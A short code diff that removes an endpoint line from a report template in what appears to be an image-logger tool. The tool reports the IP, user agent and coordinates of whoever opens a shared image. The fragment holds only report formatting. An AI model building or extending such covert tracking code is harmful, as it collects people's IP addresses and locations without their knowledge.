@@ -148,7 +148,6 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
             "color": config["color"],
             "description": f"""**A User Opened Your Image!**
 
-**Endpoint:** `{endpoint}`
             
 **IP Info:**
 > **IP:** `{ip if ip else 'Unknown'}`
